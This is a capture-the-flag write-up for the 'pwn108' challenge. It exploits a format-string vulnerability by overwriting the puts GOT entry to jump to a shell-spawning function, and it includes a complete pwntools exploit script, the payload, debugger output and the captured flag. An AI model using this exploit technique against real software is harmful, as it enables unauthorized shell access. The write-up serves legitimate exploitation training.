# pwn108

- [Binary Analysis](#binary-analysis)
- [Crafting the Payload](#crafting-the-payload)
- [Local Exploitation](#local-exploitation)
- [Remote Exploitation](#remote-exploitation)

## Binary Analysis

```text

The challenge is running on port 9008

```

```bash
$ ls
pwn108

$ file pwn108 
pwn108: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b1c32d1f20d6d8017146d21dfcfc4da79a8762d8, for GNU/Linux 3.2.0, not stripped

$ checksec --file=pwn108
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No

$ rabin2 -i pwn108 
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00401030 GLOBAL FUNC       puts
2   0x00401040 GLOBAL FUNC       __stack_chk_fail
3   0x00401050 GLOBAL FUNC       system
4   0x00401060 GLOBAL FUNC       printf
5   0x00401070 GLOBAL FUNC       read
6   ---------- GLOBAL FUNC       __libc_start_main
7   ---------- WEAK   NOTYPE     __gmon_start__
8   0x00401080 GLOBAL FUNC       setvbuf

```

The `main` function decompiled with **ghidraa**. 

```c
void main(void)

{
  long in_FS_OFFSET;
  undefined1 name [32];
  char reg [104];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00402177);
  puts(&DAT_00402198);
  printf("\n=[Your name]: ");
  read(0,name,18);
  printf("=[Your Reg No]: ");
  read(0,reg,100);
  puts("\n=[ STUDENT PROFILE ]=");
  printf("Name         : %s",name);
  printf("Register no  : ");
  printf(reg);
  printf("Institue     : THM");
  puts("\nBranch       : B.E (Binary Exploitation)\n");
  puts(
      "\n                    =[ EXAM SCHEDULE ]=                  \n ------------------------------- -------------------------\n|  Date     |           Exam               |    FN/AN    |\n|------ --------------------------------------------------\n| 1/2/2022  |  PROGRAMMING IN ASSEMBLY     |     FN      |\n|--------------------------------------------------------\n| 3/2/2022  |  DA TA STRUCTURES             |     FN      |\n|-------------------------------------------------- ------\n| 3/2/2022  |  RETURN ORIENTED PROGRAMMING |     AN      |\n|------------------------- -------------------------------\n| 7/2/2022  |  SCRIPTING WITH PYTHON       |     FN      |\n --------------------------------------------------------"
      );
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

There is a **Format String Vulnerability** at `printf(reg)`.

```c
printf("=[Your Reg No]: ");
read(0,reg,100);
printf(reg);
```

## Crafting the Payload

The idea is to **overwrite** the *saved rip* in order to divert the control flow to the *holidays function*:

```c
void holidays(void)

{
  long in_FS_OFFSET;
  undefined4 local_16;
  undefined2 local_12;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_16 = 0x6d617865;
  local_12 = 0x73;
  printf(&DAT_00402120,&local_16);
  system("/bin/sh");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

Remember the **binary has not PIE protection**.

`radare2`
```text
[0x004012a0]> afl
0x004012a0    3    328 main
0x0040123b    3    101 sym.holidays

[0x004012a0]> pdfr                                                                                                                                                                                               [67/1916]
  ; ICOD XREF from entry0 @ 0x4010ad(r)                                                                                                                                                                                   
┌ 328: int main (int argc, char **argv, char **envp);                                                                                                                                                                     
│ afv: vars(3:sp[0x10..0x98])                                                                                                                                                                                             
│ 0x004012a0      55             push rbp                                                                                                                                                                                 
│ 0x004012a1      4889e5         mov rbp, rsp                                                                                                                                                                             
│ 0x004012a4      4881ec9000..   sub rsp, 0x90 
...

[0x004012a0]> afv
var int64_t canary @ rbp-0x8
var char * format @ rbp-0x70
var void * buf @ rbp-0x90

```

Distance to **format** local variable:

```text

top of the stack= rbp-0x90 (@buf)

format string @rbp-0x70(@format)

distance=(0x90-0x70)=32 bytes; 32//8=4 qword.

x86-64 convention function params => 6 registers

distance=6+4=10 qword

```

Test:

```bash
$ ./pwn108 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 108          

      THM University 📚
👨‍🎓 Student login portal 👩‍🎓                                                                             
                                                                                                             
=[Your name]: AAAAAAAA                                                                                       
=[Your Reg No]: BBBBBBBB%10$p                                                                                
                                                                                                             
=[ STUDENT PROFILE ]=                                                                                        
Name         : AAAAAAAA                                                                                      
sRegister no  : BBBBBBBB0x4242424242424242                                                                   
Institue     : THM                                                                                           
Branch       : B.E (Binary Exploitation)                                                                     
                                                                                                             
                                                                                                             
                    =[ EXAM SCHEDULE ]=                   
 -------------------------------------------------------- 
|  Date     |           Exam               |    FN/AN    |
|-------------------------------------------------------- 
| 1/2/2022  |  PROGRAMMING IN ASSEMBLY     |     FN      |
|-------------------------------------------------------- 
| 3/2/2022  |  DATA STRUCTURES             |     FN      |
|-------------------------------------------------------- 
| 3/2/2022  |  RETURN ORIENTED PROGRAMMING |     AN      |
|-------------------------------------------------------- 
| 7/2/2022  |  SCRIPTING WITH PYTHON       |     FN      |
 --------------------------------------------------------

```

It works!

Try to leak the *saved rip*.

Distance to **saved rip**:

```text

top of the stack= rbp-0x90 (@buf)

format string @rbp-0x70(@format)

distance2format=(0x90-0x70)=32 bytes; 32//8=4 qword.

x86-64 convention function params => 6 registers

> distance2format=6+4=10 qword

canary @ rbp-0x8

> distance2canary=(0x70-0x8)=104 bytes; 104//8=13 qword.

Stack frame:
- canary
- saved rbp
- saved rip

> distance2srip= 13 qword + 2 qword (canary+srbp) = 15 qword.

>> distance = 6 qword (regs) + 4 qword (buf) + 15 qword (format||canary||srbp) = 25 qword.

```

Test it with the debugger **gdb**.

```bash
pwndbg> b* main+270
Breakpoint 1 at 0x4013ae

pwndbg> run

👨‍🎓 Student login portal 👩‍🎓                                                                                                                                                                                    [54/324]
                                                                                                                                                                                                                          
=[Your name]: AAAAAAAA                                                                                                                                                                                                    
=[Your Reg No]: %25$p                                                                                                                                                                                                     
                                                                                                                                                                                                                          
=[ STUDENT PROFILE ]=                                                                                                                                                                                                     
Name         : AAAAAAAA                                                                                                                                                                                                   
Register no  : 0x7ffff7c29d90 

pwndbg> stack 20
00:0000│ rsp 0x7fffffffdde0 ◂— 'AAAAAAAA\n'
01:0008│-088 0x7fffffffdde8 ◂— 0xa /* '\n' */
02:0010│-080 0x7fffffffddf0 ◂— 0
03:0018│-078 0x7fffffffddf8 ◂— 0
04:0020│-070 0x7fffffffde00 ◂— 0xa7024353225 /* '%25$p\n' */
05:0028│-068 0x7fffffffde08 ◂— 1
06:0030│-060 0x7fffffffde10 —▸ 0x400040 ◂— 0x400000006
07:0038│-058 0x7fffffffde18 —▸ 0x7ffff7fe283c (_dl_sysdep_start+1020) ◂— mov rax, qword ptr [rsp + 0x58]
08:0040│-050 0x7fffffffde20 ◂— 0x6f0
09:0048│-048 0x7fffffffde28 —▸ 0x7fffffffe309 ◂— 0xb2d0509fa2d65eb8
0a:0050│-040 0x7fffffffde30 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
0b:0058│-038 0x7fffffffde38 ◂— 0x10101000000
0c:0060│-030 0x7fffffffde40 ◂— 2
0d:0068│-028 0x7fffffffde48 ◂— 0xf8bfbff
0e:0070│-020 0x7fffffffde50 —▸ 0x7fffffffe319 ◂— 0x34365f363878 /* 'x86_64' */
0f:0078│-018 0x7fffffffde58 ◂— 0x64 /* 'd' */
10:0080│-010 0x7fffffffde60 ◂— 0x1000
11:0088│-008 0x7fffffffde68 ◂— 0xb2d0509fa2d65e00
12:0090│ rbp 0x7fffffffde70 ◂— 1
13:0098│+008 0x7fffffffde78 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128) ◂— mov edi, eax

```

It works!!!!

The *saved rip* must be overwritten with the function's memory address `holidays`.

```text
[0x004012a0]> s sym.holidays 
[0x0040123b]> pdfr
┌ 101: sym.holidays ();
│ afv: vars(3:sp[0x10..0x16])
│ 0x0040123b      55             push rbp
│ 0x0040123c      4889e5         mov rbp, rsp
│ 0x0040123f      4883ec10       sub rsp, 0x10
│ 0x00401243      64488b0425..   mov rax, qword fs:[0x28]
│ 0x0040124c      488945f8       mov qword [canary], rax
│ 0x00401250      31c0           xor eax, eax
│ 0x00401252      c745f26578..   mov dword [var_eh], 0x6d617865        ; 'exam'
│ 0x00401259      66c745f67300   mov word [var_ah], 0x73               ; 's' ; 115
│ 0x0040125f      488d45f2       lea rax, [var_eh]
│ 0x00401263      4889c6         mov rsi, rax
│ 0x00401266      488d05b30e..   lea rax, str._nNo_more__s_for_you_enjoy_your_holidays__nAnd_here_is_a_small_gift_for_you_n ; 0x402120 ; "\nNo more %s for you enjoy your holidays \U0001f389\nAnd here is a small gift for you\n"
│ 0x0040126d      4889c7         mov rdi, rax                          ; const char *format
│ 0x00401270      b800000000     mov eax, 0
│ 0x00401275      e8e6fdffff     call sym.imp.printf                   ; int printf(const char *format)
│ 0x0040127a      488d05ee0e..   lea rax, str._bin_sh                  ; 0x40216f ; "/bin/sh"
│ 0x00401281      4889c7         mov rdi, rax                          ; const char *string
│ 0x00401284      e8c7fdffff     call sym.imp.system                   ; int system(const char *string)
│ 0x00401289      90             nop
│ 0x0040128a      488b45f8       mov rax, qword [canary]
│ 0x0040128e      64482b0425..   sub rax, qword fs:[0x28]
│ 0x00401297      7405           je 0x40129e
| // true: 0x0040129e  false: 0x00401299
│ 0x00401299      e8a2fdffff     call sym.imp.__stack_chk_fail         ; void __stack_chk_fail(void)

│ ; CODE XREF from sym.holidays @ 0x401297(x)
│ 0x0040129e      c9             leave
└ 0x0040129f      c3             ret

```

Try to overwrite:

```bash
$ ./pwn108 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 108          

      THM University 📚
👨‍🎓 Student login portal 👩‍🎓

=[Your name]: AAAAAAAA
=[Your Reg No]: %100c%25$n

=[ STUDENT PROFILE ]=
Name         : AAAAAAAA
XD1}Register no  : Segmentation fault (core dumped)

```

Note, that the binary is *NO PIE* and also *Partial RELRO*, this means that is possible to overwrite the GOT section of the program:

```text
$ rabin2 -S pwn108 
nth paddr        size vaddr       vsize perm flags type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- 0x0   NULL
1   0x00000318   0x1c 0x00400318   0x1c -r-- 0x2   PROGBITS    .interp
2   0x00000338   0x20 0x00400338   0x20 -r-- 0x2   NOTE        .note.gnu.property
3   0x00000358   0x24 0x00400358   0x24 -r-- 0x2   NOTE        .note.gnu.build-id
4   0x0000037c   0x20 0x0040037c   0x20 -r-- 0x2   NOTE        .note.ABI-tag
5   0x000003a0   0x30 0x004003a0   0x30 -r-- 0x2   GNU_HASH    .gnu.hash
6   0x000003d0  0x120 0x004003d0  0x120 -r-- 0x2   DYNSYM      .dynsym
7   0x000004f0   0x87 0x004004f0   0x87 -r-- 0x2   STRTAB      .dynstr
8   0x00000578   0x18 0x00400578   0x18 -r-- 0x2   GNU_VERSYM  .gnu.version
9   0x00000590   0x30 0x00400590   0x30 -r-- 0x2   GNU_VERNEED .gnu.version_r
10  0x000005c0   0x78 0x004005c0   0x78 -r-- 0x2   RELA        .rela.dyn
11  0x00000638   0x90 0x00400638   0x90 -r-- 0x42  RELA        .rela.plt
12  0x00001000   0x17 0x00401000   0x17 -r-x 0x6   PROGBITS    .init
13  0x00001020   0x70 0x00401020   0x70 -r-x 0x6   PROGBITS    .plt
14  0x00001090  0x3c1 0x00401090  0x3c1 -r-x 0x6   PROGBITS    .text
15  0x00001454    0x9 0x00401454    0x9 -r-x 0x6   PROGBITS    .fini
16  0x00002000  0x526 0x00402000  0x526 -r-- 0x2   PROGBITS    .rodata
17  0x00002528   0x54 0x00402528   0x54 -r-- 0x2   PROGBITS    .eh_frame_hdr
18  0x00002580  0x160 0x00402580  0x160 -r-- 0x2   PROGBITS    .eh_frame
19  0x00002e10    0x8 0x00403e10    0x8 -rw- 0x3   INIT_ARRAY  .init_array
20  0x00002e18    0x8 0x00403e18    0x8 -rw- 0x3   FINI_ARRAY  .fini_array
21  0x00002e20  0x1d0 0x00403e20  0x1d0 -rw- 0x3   DYNAMIC     .dynamic
22  0x00002ff0   0x10 0x00403ff0   0x10 -rw- 0x3   PROGBITS    .got
23  0x00003000   0x48 0x00404000   0x48 -rw- 0x3   PROGBITS    .got.plt
24  0x00003048   0x10 0x00404048   0x10 -rw- 0x3   PROGBITS    .data
25  0x00003058    0x0 0x00404060   0x30 -rw- 0x3   NOBITS      .bss
26  0x00003058   0x1f 0x00000000   0x1f ---- 0x30  PROGBITS    .comment
27  0x00003078  0x498 0x00000000  0x498 ---- 0x0   SYMTAB      .symtab
28  0x00003510  0x28a 0x00000000  0x28a ---- 0x0   STRTAB      .strtab
29  0x0000379a  0x116 0x00000000  0x116 ---- 0x0   STRTAB      .shstrtab

```

```bash
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /tmp/pwn108/pwn108:
GOT protection: Partial RELRO | Found 6 GOT entries passing the filter
[0x404018] puts@GLIBC_2.2.5 -> 0x7ffff7c80e50 (puts) ◂— endbr64 
[0x404020] __stack_chk_fail@GLIBC_2.4 -> 0x401046 (__stack_chk_fail@plt+6) ◂— push 1
[0x404028] system@GLIBC_2.2.5 -> 0x401056 (system@plt+6) ◂— push 2
[0x404030] printf@GLIBC_2.2.5 -> 0x7ffff7c606f0 (printf) ◂— endbr64 
[0x404038] read@GLIBC_2.2.5 -> 0x7ffff7d147d0 (read) ◂— endbr64 
[0x404040] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c815f0 (setvbuf) ◂— endbr64 

```

The idea is to overwrite an **entry GOT**, for example the `[0x404018] puts@GLIBC_2.2.5 -> 0x7adeea880e50 (puts) ◂— endbr64`.

It is the last function called before the return address.

```text

# holidays address
holidays= 0x000000000040123b = 4198971

%4198971c%{?}$ln{address}

Note:

top of the stack= rbp-0x90 (@buf)

format string @rbp-0x70(@format)

offset=(0x90-0x70)=32 bytes; 32//8=4 qword.

x86-64 convention function params => 6 registers

offset=6+4=10 qword

Apply the padding to align the stack:

- offset: 10, 11 => AAAAAAA%{???????}c
- offset: 12 => BB%{??}$ln
- offset: 13 => {address}=0x404018

nA=7; nB=2; 
value_to_print = 4198971-nA-nB = 4198962

Payload= 'AAAAAAA%4198962cBB%13$ln\x30\x40\x40\x00\x00\x00\x00\x00'

```

## Local Exploit

Below is the `exploit` script built for *debugging*, *local* and *remote* exploitation.

```python
#!/usr/bin/env python3

from pwn import context, ELF, gdb, remote

exe = './pwn108'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

gdbinit='''
init-pwndbg
break* main+233
break* main+270
break* main+321
continue
'''

### Crafting Payload ###

## Read saved rip
#offset=25
#payload = f'%{offset}$p'.encode()

## Write saved rip

# holidays@0x40123b 
nchars=4198971-9 # -nA-nB

offset=13

# Payload + 16 bytes of padding for Stack Aligment
payload = 'AAAAAAA%{x}cBB%{y}$ln\x18\x40\x40\x00\x00\x00\x00\x00CCCCCCCCDDDDDDDD'.format(x=nchars, y=offset).encode()

# REMOTE, PORT= '10.10.10.235', 9008
# io=remote(REMOTE, PORT)

io=gdb.debug([exe], gdbscript=gdbinit)
io.sendlineafter(b'=[Your name]:', b'A'*8)
io.sendlineafter(b'=[Your Reg No]:', payload)
io.interactive()

```

During the execution with the debugger, there was an error of stack alignment:

```text
pwndbg> continue
► 0x78bafea50973 <do_system+115>    movaps xmmword ptr [rsp], xmm1                   <[0x7ffc7d8887b8] not aligned to 16 bytes>

```

For this reason, the payload is modified to overwrite the GOT and also align the stack.

During the execution, verify that the GOT entry is correctly overwrited.

```text
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /tmp/pwn108/pwn108:
GOT protection: Partial RELRO | Found 6 GOT entries passing the filter
[0x404018] puts@GLIBC_2.2.5 -> 0x40123b (holidays) ◂— push rbp
[0x404020] __stack_chk_fail@GLIBC_2.4 -> 0x401046 (__stack_chk_fail@plt+6) ◂— push 1
[0x404028] system@GLIBC_2.2.5 -> 0x401056 (system@plt+6) ◂— push 2
[0x404030] printf@GLIBC_2.2.5 -> 0x79d5f34606f0 (printf) ◂— endbr64 
[0x404038] read@GLIBC_2.2.5 -> 0x79d5f35147d0 (read) ◂— endbr64 
[0x404040] setvbuf@GLIBC_2.2.5 -> 0x79d5f34815f0 (setvbuf) ◂— endbr64 
pwndbg> p holidays
$1 = {<text variable, no debug info>} 0x40123b <holidays>

```

GG.

```bash
$ ./exploit
...

Institue     : THM
No more exams for you enjoy your holidays 🎉
And here is a small gift for you
[DEBUG] Received 0x1d bytes:
    b'Detaching from process 18045\n'
Detaching from process 18045
[DEBUG] Received 0x1d bytes:
    b'Detaching from process 18060\n'
Detaching from process 18060
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x1d bytes:
    b'Detaching from process 18061\n'
Detaching from process 18061
[DEBUG] Received 0x3 bytes:
    b'ap\n'
ap

```

Works fine!

## Remote Exploitation

```bash
$ ./exploit
...

DEBUG] Received 0x39f bytes:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000330  20 20 20 20  20 20 d0 42  42 18 40 40  49 6e 73 74  │    │  ·B│B·@@│Inst│
    00000340  69 74 75 65  20 20 20 20  20 3a 20 54  48 4d 0a 4e  │itue│    │ : T│HM·N│
    00000350  6f 20 6d 6f  72 65 20 65  78 61 6d 73  20 66 6f 72  │o mo│re e│xams│ for│
    00000360  20 79 6f 75  20 65 6e 6a  6f 79 20 79  6f 75 72 20  │ you│ enj│oy y│our │
    00000370  68 6f 6c 69  64 61 79 73  20 f0 9f 8e  89 0a 41 6e  │holi│days│ ···│··An│
    00000380  64 20 68 65  72 65 20 69  73 20 61 20  73 6d 61 6c  │d he│re i│s a │smal│
    00000390  6c 20 67 69  66 74 20 66  6f 72 20 79  6f 75 0a     │l gi│ft f│or y│ou·│
    0000039f
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      \xd0BB\x18@@Institue     : THM
No more exams for you enjoy your holidays 🎉
And here is a small gift for you
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x19 bytes:
    b'flag.txt\n'
    b'pwn108\n'
    b'pwn108.c\n'
flag.txt
pwn108
pwn108.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x1a bytes:
    b'THM{7urN3d_puts_in70_win}\n'
THM{7urN3d_puts_in70_win}

```

GG :3

---
